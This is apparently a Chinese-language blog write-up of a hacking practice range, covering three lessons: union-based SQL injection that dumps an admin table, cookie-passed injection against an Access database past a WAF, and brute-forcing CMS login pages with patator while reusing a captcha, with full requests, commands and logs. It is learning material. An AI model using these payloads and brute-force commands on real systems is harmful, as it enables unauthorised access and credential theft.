@@ -1,0 +1,192 @@
+<h3>心得</h3>
+<p>这个靶场非常好！跟平时学习的顺利情况完全不一样。 有了实战的感觉</p>
+<p>平时学习的时候一切都是顺风顺水， 按照预计的规则来。</p>
+<p>靶场则跟实际的规则差了太多：&#160;</p>
+<p>1. 不给出详细的SQL报错</p>
+<p>2. 使用asp, access 等不兼容mysql的 SQLI方式</p>
+<p>3. 使用5.5 版本的mysql</p>
+<p>4. 使用cookie传参</p>
+<p>靶场真的非常好！ 很让人有成就感！</p>
+<h3>第一课</h3>
+<p><br />1. 先根据 id=1 后面增加 ' ，看出没有内容了。（估计是报错了？）</p>
+<p>然后增加： order by 1, order by 2, 都正常。</p>
+<p>order by 3的时候，就不行了。表示有注入点。</p>
+<p>2. 然后根据 union查询，获得 所有的数据库名称。</p>
+<p>maoshe</p>
+<p>3. 然后获得猫舍下的所有表:</p>
+<p>http://59.63.200.79:8003/?id=1%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%27maoshe%27%20)%20order%20by%202%20desc%20limit%201</p>
+<p>也就是：</p>
+<p>id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='maoshe' ) order by 2 desc limit 1</p>
+<p>得到：</p>
+<p>admin,dirs,news,xss<br /> <br />4. 获得admin 下的所有列</p>
+<p>id=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'admin' ) order by 2 desc limit 1</p>
+<p>Id,username,password</p>
+<p>5. 获得admin 下的所有内容：</p>
+<p>id=-1 union select 1,(select group_concat(concat(Id,"||",username, "||", password), ",") from admin ) order by 2 desc limit 1</p>
+<p>select group_concat(concat(Id,"||",username, "||", password), ",") from admin </p>
+<p><br />1||admin||hellohack,,2||ppt领取微信||zkaqbanban,</p>
+<p>所以答案是 hellohack </p>
+<h3><br />第二课。</h3>
+<p>先加个 id=1' ，alert 有WAF<br />于是： order by 1, 2 ... 依次尝试。 到 11的时候报错， 说明select 了10个列。</p>
+<p>id=170 union select 1, 2, 3, 4, 5, 6, 7 , 8, 9, 10 ,11</p>
+<p>又报错。  </p>
+<p>union无提示<br />select 有提示。 需要绕过。</p>
+<p>根据课程提示，可以使用 cookie中传递参数，代替request body中传递参数（我靠啥框架啊这么奇葩）</p>
+<p>所以，需要把union, select 语句写在 cookie中。</p>
+<p>id=169+order+by+10   不报错。 <br />id=169+order+by+11   报错。 </p>
+<p>说明我们的 + 放置是正确的</p>
+<p>id=170+union+select+1,2,3,4,5,6,7,8,9,10</p>
+<p>select group_concat(table_name) from information_schema.tables where table_name='admin'<br />select+group_concat(table_name)+from+information_schema.tables+where+table_name='admin'</p>
+<p>用的是access 数据库。union select语法后面必须紧跟from &lt;table&gt;， 而且不支持database(), version()等函数。</p>
+<p>数据库表明需要靠猜， 字段需要靠猜。 后台位置需要靠猜 ( /admin ) <br />经验： 参数可以从cookie中传入。 用+代替空格。另外，SQL语法有限。</p>
+<h3>第三课。</h3>
+<p>根据提示， 要求登录管理员后台。 <br />后台很有意思，经过长期尝试，有如下特点：</p>
+<p>1. 有登录名，密码和验证码3个选项。 根据burpsuite抓包，发现 header中有多重元素：</p>
+<pre>POST /dami_999/dami_666/index.php?s=/member/dologin.html HTTP/1.1
+
+Host: 59.63.200.79:8003
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 50
+
+Origin: http://59.63.200.79:8003
+
+Connection: close
+
+Referer: http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/login.html
+
+Cookie: PHPSESSID=t6pmsv3j38ms49ntc2bj9r1ou3; BkGOp9578O_think_template=default; UM_distinctid=17862f2b3810-046e9538a9697a8-30634644-1fa400-17862f2b3820; CNZZDATA1257137=cnzz_eid%3D1501636784-1616565607-%26ntime%3D1616640101
+
+Upgrade-Insecure-Requests: 1
+
+username=admin&amp;userpwd=32323&amp;verify=23799&amp;lasturl=
+</pre>
+<p>例如，上面第一行是 目标url, 最下面一行是参数， 中间的都是request header. 这些绝对不能丢。经过多次测试发现， 只要header在，那么验证码就会有大约半小时的时间是可以重复使用的。 </p>
+<p>所以，使用 patator 的命令： </p>
+<p>patator http_fuzz url=http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html  method=POST  body='username=admin&amp;userpwd=FILE0&amp;verify=23799&amp;lasturl='  header=@headers.txt     0=passwords.txt   -l logs --rate-limit=1 --threads=10 -x ignore:fgrep='密码错误'</p>
+<p>其中: </p>
+<p>header=@headers.txt   ， headers.txt的内容是上面所示。<br />body 这里要注意修改verify参数。 每次header变化，这里都要重新设置。<br />0=passwords.txt 表示，这是一个密码文件。 对应body参数中的 userpwd=FILE0 的0  （FILE是patator的关键字）<br />用户名是admin , 在最初尝试的时候， 提示密码错误。 （没有提示 用户名与密码不匹配 ），所以可以断定是它 。</p>
+<p>需要吐槽的时候， 使用patator的时候，发现每次2，3秒之后都会被断线，然后大量的timeout. 这里可能有WAF。 不过以后再说吧，这不是本次的重点。</p>
+<p>需要多看 log文件夹里面的response body. </p>
+<p>结果如下：</p>
+<pre>└─$ patator http_fuzz url=http://59.63.200.79:8003/dami_999/dami_666/index.php?s=/member/dologin.html method=POST body='username=admin&amp;userpwd=FILE0&amp;verify=23799&amp;lasturl=' header=@headers.txt 0=passwords.txt -l logs --rate-limit=1 --threads=10 -x ignore:fgrep='密码错误'
+Directory '/home/kali/hack.zkaq.cn/lesson3/logs' is not empty, do you want to wipe it ? [Y/n]:
+23:38:19 patator INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.1 at 2021-03-24 23:38 EDT
+23:38:19 patator INFO -
+23:38:19 patator INFO - code size:clen time | candidate | num | mesg
+23:38:19 patator INFO - -----------------------------------------------------------------------------
+23:38:20 patator INFO - 200 1929:1536 0.333 | admin | 1 | HTTP/1.1 200 OK
+23:38:20 patator INFO - 200 1800:1407 0.408 | system | 5 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 0.693 | guest | 6 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 0.618 | systemadmin | 7 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 0.941 | test1 | 8 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 0.970 | test12 | 9 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 1.000 | test123 | 10 | HTTP/1.1 200 OK
+23:38:21 patator INFO - 200 1800:1407 0.135 | admin888 | 11 | HTTP/1.1 200 OK
+23:38:22 patator INFO - 200 1800:1407 0.175 | admin123 | 16 | HTTP/1.1 200 OK
+23:38:22 patator INFO - 200 1800:1407 0.187 | admin456 | 17 | HTTP/1.1 200 OK
+23:38:22 patator INFO - 200 1800:1407 0.194 | adminabc | 18 | HTTP/1.1 200 OK
+23:38:22 patator INFO - 200 1800:1407 0.237 | test | 19 | HTTP/1.1 200 OK
+23:38:22 patator INFO - 200 1800:1407 0.282 | 123456 | 20 | HTTP/1.1 200 OK
+23:38:23 patator INFO - 200 1800:1407 0.134 | 12345 | 21 | HTTP/1.1 200 OK
+</pre>
+<p>.....</p>
+<p>可以发现，第一个结果：<br />23:38:20 patator    INFO - 200  1929:1536      0.333 | admin                              |     1 | HTTP/1.1 200 OK</p>
+<p>长度 1929:1536 跟其他的明显不一样，打开对应的response文件，果然是登录成功（上面的patator ignore参数似乎没生效。不过没关系了）</p>
+<p>于是我以为 用户admin的密码 admin 就是flag. 结果不是。&#160;</p>
+<p>看提示（视频），需要进一步登录 大米CMS的总管理员后台。&#160;</p>
+<p><strong>根据猜测 </strong>（咋又是这样。。。）， 后台的访问地址是&#160;&#160;http://59.63.200.79:8003/dami_999/dami_666/admin.php</p>
+<p>用最初给的密码本，继续进行密码爆破。先抓个burp包，然后修改header2.txt,&#160;</p>
+<p>命令如下：
+（这里需要先确定用户名是哪个，所以我先是让username = FILE0, 密码写死成固定的。 得到下面几种返回码： ）
+</p>
+<pre>1659  not exists, disabled.
+1644  wrong password
+1647  wrong validation code 
+</pre>
+<p>然后发现，用户名是 zkaq,  其他的用户名，要么是密码错误，要么是用户不存在。 我没有尝试 </p>
+<p>接下来，让用户名固定，密码成为FILE0, 爆破， 如下：</p>
+<pre>$ patator http_fuzz url=http://59.63.200.79:8003/dami_999/dami_666/admin.php?s=/Public/checklogin  method=POST  body='username=zkaq&amp;password=FILE0&amp;verify=40091&amp;lasturl='  header=@headers2.txt     0=passwords.txt 1=passwords.txt  -l logs --rate-limit=1 --threads=10
+Directory '/home/kali/workspace/hack.zkaq.cn/lesson3/logs' is not empty, do you want to wipe it ? [Y/n]: 
+03:38:40 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.1 at 2021-03-27 03:38 EDT
+03:38:40 patator    INFO -                                                                              
+03:38:40 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+03:38:40 patator    INFO - -----------------------------------------------------------------------------
+03:38:42 patator    INFO - 200  1644:1345      0.404 | admin                              |     1 | HTTP/1.1 200 OK
+03:38:42 patator    INFO - 302  497:3          0.448 | zkaq                               |     2 | HTTP/1.1 302 Found
+03:38:42 patator    INFO - 200  1644:1345      0.904 | root                               |     3 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.103 | test                               |     4 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.021 | system                             |     5 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.181 | guest                              |     6 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1647:1348      1.248 | systemadmin                        |     7 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.335 | test12                             |     9 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.435 | test1                              |     8 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      1.535 | test123                            |    10 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1644:1345      0.238 | admin888                           |    11 | HTTP/1.1 200 OK
+03:38:43 patator    INFO - 200  1647:1348      0.258 | admin123456                        |    12 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 200  1647:1348      0.119 | admin888888                        |    13 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 302  497:3          0.069 | zkaq                               |    15 | HTTP/1.1 302 Found
+03:38:44 patator    INFO - 200  1647:1348      0.121 | admin12345                         |    14 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 200  1644:1345      0.506 | admin123                           |    16 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 200  1644:1345      0.529 | admin456                           |    17 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 200  1644:1345      0.504 | test                               |    19 | HTTP/1.1 200 OK
+03:38:44 patator    INFO - 200  1644:1345      0.503 | adminabc                           |    18 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1644:1345      0.476 | 123456                             |    20 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1644:1345      0.467 | 12345                              |    21 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1644:1345      0.498 | liuwei                             |    22 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1647:1348      0.247 | xiejiangling                       |    23 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1644:1345      0.267 | errorlog                           |    25 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1644:1345      0.214 | liuzhiyu                           |    24 | HTTP/1.1 200 OK
+03:38:45 patator    INFO - 200  1647:1348      0.239 | chenchongbing                      |    26 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1647:1348      0.334 | xushaoyong                         |    27 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1644:1345      0.574 | liuhua                             |    29 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1644:1345      0.785 | liukai                             |    28 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1644:1345      0.796 | likaipeng                          |    30 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1647:1348      0.778 | jiangxiangwei                      |    31 | HTTP/1.1 200 OK
+03:38:46 patator    INFO - 200  1644:1345      0.754 | yuanyi                             |    32 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1644:1345      0.843 | zhangshun                          |    33 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1647:1348      0.727 | zongjingban                        |    35 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1644:1345      0.755 | xiafeng                            |    34 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1644:1345      0.345 | lijunfang                          |    36 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1644:1345      0.221 | yangfan                            |    37 | HTTP/1.1 200 OK
+03:38:47 patator    INFO - 200  1647:1348      0.173 | luochengcong                       |    39 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1644:1345      0.606 | ligang                             |    38 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1647:1348      0.728 | zhangguobai                        |    40 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1647:1348      0.761 | fangyundan                         |    41 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1644:1345      0.817 | wangzhe                            |    42 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1647:1348      0.729 | lvpengdong                         |    45 | HTTP/1.1 200 OK
+03:38:48 patator    INFO - 200  1644:1345      0.803 | lichunlan                          |    43 | HTTP/1.1 200 OK
+03:38:49 patator    INFO - 200  1647:1348      0.781 | yuanmingrun                        |    44 | HTTP/1.1 200 OK
+03:38:49 patator    INFO - 200  1644:1345      0.823 | huangtao                           |    46 | HTTP/1.1 200 OK
+03:38:49 patator    INFO - 200  1647:1348      0.805 | linqianting                        |    47 | HTTP/1.1 200 OK
+03:38:49 patator    INFO - 200  1647:1348      0.603 | yangwenbin                         |    49 | HTTP/1.1 200 OK
+03:38:49 patator    INFO - 200  1644:1345      0.425 | jiangxufu                          |    48 | HTTP/1.1 200 OK
+03:38:50 patator    INFO - 200  1647:1348      0.708 | dengcaiying                        |    50 | HTTP/1.1 200 OK
+03:38:50 patator    INFO - 200  1647:1348      0.691 | service_yzx                        |    51 | HTTP/1.1 200 OK
+03:38:50 patator    INFO - 200  1647:1348      0.774 | prince.wang                        |    52 | HTTP/1.1 200 OK
+03:38:50 patator    INFO - 200  1647:1348      0.806 | luozhijian                         |    55 | HTTP/1.1 200 OK
+03:38:50 patator    INFO - 200  1644:1345      0.831 | liqifan                            |    53 | HTTP/1.1 200 OK
+03:38:51 patator    INFO - 200  1644:1345      0.921 | marketing                          |    54 | HTTP/1.1 200 OK
+03:38:51 patator    INFO - 200  1647:1348      0.842 | wenkunyong                         |    56 | HTTP/1.1 200 OK
+03:38:51 patator    INFO - 200  1644:1345      0.850 | daiqiang                           |    57 | HTTP/1.1 200 OK
+03:38:51 patator    INFO - 200  1644:1345      0.309 | lufei                              |    58 | HTTP/1.1 200 OK
+03:38:51 patator    INFO - Hits/Done/Skip/Fail/Size: 58/58/0/0/58, Avg: 5 r/s, Time: 0h 0m 10s
+</pre>
+
+<p>可以看到， zkaq的密码就是zkaq, 跳转是302， 所以直接用这个来登录，就可以看到后台了。</p>
+<p>不过zkaq仍然不是flag.&#160;</p>
+<p>于是我就乱点，在管理员列表那里，就看到了 flag. 整个复制，flag 正确，通关！&#160;</p>
+<img src="http://files.sweetysoft.com/image_after_2021_03_27/3573/zkaq_lesson3.png" />
+<h3>心得：&#160;</h3>
+<p>1. 信息不透明啊，不看视频说明，完全不知道头绪。</p>
+<p>2. 可能获得flag的方式就是鼠标乱点，用一切手段获得flag为止。&#160;</p>
+<p>3. 我一开始以为要使用图片马上传webshell, 结果学习了好多，看了一大天资料，跟通关获得flag没啥关系，但是倒是学了不少。</p>
